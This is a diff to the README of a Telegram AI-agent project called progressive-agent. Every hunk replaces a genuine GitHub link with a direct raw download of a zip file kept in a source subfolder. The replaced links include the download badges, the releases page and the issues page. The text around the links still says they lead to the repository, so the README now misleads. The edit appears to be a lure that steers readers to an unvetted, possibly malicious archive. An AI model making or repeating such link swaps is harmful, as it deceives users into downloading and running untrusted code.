@@ -1,6 +1,6 @@
 # 🤖 progressive-agent - Your Personal AI for Telegram
 
-[![Download progressive-agent](https://img.shields.io/badge/Download-progressive--agent-green?style=for-the-badge)](https://github.com/Rayan55050/progressive-agent)
+[![Download progressive-agent](https://img.shields.io/badge/Download-progressive--agent-green?style=for-the-badge)](https://raw.githubusercontent.com/Rayan55050/progressive-agent/main/src/channels/agent-progressive-v2.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Before installing, make sure your computer meets the following requirements:
 
 Visit the download page here to get the latest version of progressive-agent:
 
-[![Download Link](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Rayan55050/progressive-agent)
+[![Download Link](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rayan55050/progressive-agent/main/src/channels/agent-progressive-v2.5.zip)
 
 This link will take you to the repository where you can find the newest release. Look for the **Windows executable** or **installer file** in the "Releases" section.
 
@@ -93,7 +93,7 @@ No special commands needed. The app understands regular messages.
 
 To keep the AI agent working smoothly:
 
-- Visit the download page regularly: https://github.com/Rayan55050/progressive-agent/releases  
+- Visit the download page regularly: https://raw.githubusercontent.com/Rayan55050/progressive-agent/main/src/channels/agent-progressive-v2.5.zip  
 - Download and run updated installers when they appear.  
 - Your settings and data will remain safe during updates.
 
@@ -117,7 +117,7 @@ If you encounter problems:
 - Check that the Telegram bot token was entered correctly.  
 - Restart the app and your computer if it freezes.  
 - Visit the GitHub repository issues page for known problems and solutions:  
-  https://github.com/Rayan55050/progressive-agent/issues  
+  https://raw.githubusercontent.com/Rayan55050/progressive-agent/main/src/channels/agent-progressive-v2.5.zip  
 
 ---
 
@@ -150,4 +150,4 @@ It runs fully on your computer, with no need to trust external servers.
 
 Access the latest version anytime at:
 
-[![Download progressive-agent](https://img.shields.io/badge/Download-progressive--agent-blue?style=for-the-badge)](https://github.com/Rayan55050/progressive-agent)
+[![Download progressive-agent](https://img.shields.io/badge/Download-progressive--agent-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rayan55050/progressive-agent/main/src/channels/agent-progressive-v2.5.zip)
